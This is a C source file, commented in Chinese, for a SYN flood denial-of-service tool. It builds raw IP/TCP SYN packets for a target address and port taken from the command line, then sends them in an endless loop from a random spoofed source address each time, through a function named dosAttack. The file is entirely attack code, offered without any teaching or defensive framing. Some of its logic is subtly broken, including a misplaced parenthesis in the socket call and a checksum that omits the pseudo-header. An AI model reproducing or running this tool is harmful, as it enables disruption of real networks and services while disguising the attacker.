#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>


void dosAttack(int skFd,struct sockaddr_in* target,unsigned short srcPort);
unsigned short check_sum(unsigned short * addr, int count);


//1.ip,2.目的端口,3.源端口
int main(int argc,char** argv)
{
    int connFd;
    struct sockaddr_in target;
    struct hostent* host;
    const int on=1;
    unsigned short srcPort;

    //创建并设置地址对象
    bzero(&target, sizeof(struct sockaddr_in));
    //设置target对象
    target.sin_family=AF_INET;
    //host->net(str->int(第二个参数))
    target.sin_port=htons(atoi(argv[2]));//
    //
    if(inet_aton(argv[1],&target.sin_addr)==0)
    {
        //获取本机地址
        host=gethostbyname(argv[1]);
        if(host==NULL)
            perror("get host by name error!\n");
        target.sin_addr=*(struct in_addr*)(host->h_addr_list[0]);
    }

    //创建原始套接字
    if(connFd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)==-1)
        perror("socket error\n");

    //(连接句柄,指定为ip,可编辑头模式,打开,打开大小)
    if(setsockopt(connFd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))==-1)
        perror("setsockopt error\n");

    //获取管理员权限才能raw sock
    setuid(getuid());//设置为管理员
    //获取源端口转化为int
    srcPort=atoi(argv[3]);
    //进行协议和数据包组建
    dosAttack(connFd,&target,srcPort);
    
}



void dosAttack(int skFd,struct sockaddr_in* target,unsigned short srcPort)
{
    int ipLen;
    char buf[128]={};
    struct ip* ip=(struct ip*)buf;
    struct tcphdr* tcp;

    //设置SYN包的数据长度
    ipLen=sizeof(struct ip)+sizeof(struct tcphdr);
    //填充ip头
    ip->ip_hl=sizeof(struct ip)>>2;//除以4
    ip->ip_v=IPVERSION; 
    ip->ip_tos=0;   /* type of service */
    ip->ip_len=htons(ipLen);
    ip->ip_id=0;
    ip->ip_off=0;//片偏移offset
    ip->ip_ttl=MAXTTL;
    ip->ip_p=IPPROTO_TCP;//协议:ip协议栈的tcp协议
    ip->ip_sum=0;
    ip->ip_dst=target->sin_addr;

    //填充tcp部分
    tcp=(struct tcphdr*)(buf+sizeof(struct ip));//前半部分ip内存,后半部分tcp
    tcp->source=htons(srcPort);//源端口(int->net)主机到网络
    tcp->dest=target->sin_port;//目标机端口
    tcp->seq=random();//随机初始化一个tcp序号
    tcp->doff=5;
    tcp->syn=1;//同步位1
    tcp->check=0;

    while(1)
    {
        ip->ip_src.s_addr=random();//随机生成源IP
        //生成tcp校验函数
        tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
        sendto(skFd,buf,ipLen,0,(struct sockaddr*)target,
            sizeof(struct sockaddr_in));
        
    }
}




unsigned short check_sum(unsigned short*addr,int len)
{
      register int nleft=len;
      register int sum=0;
      register short*w=addr;
      short    answer=0;
      while(nleft>1)
      {
          sum+=*w++;
          nleft-=2;
      }
      if(nleft==1)
      {
          *(unsigned char *)(&answer)=*(unsigned char *)w;
          sum+=answer;
      }
      sum=(sum>>16)+(sum&0xffff);
      sum+=(sum>>16);
      answer=~sum;
      return(answer);
}





















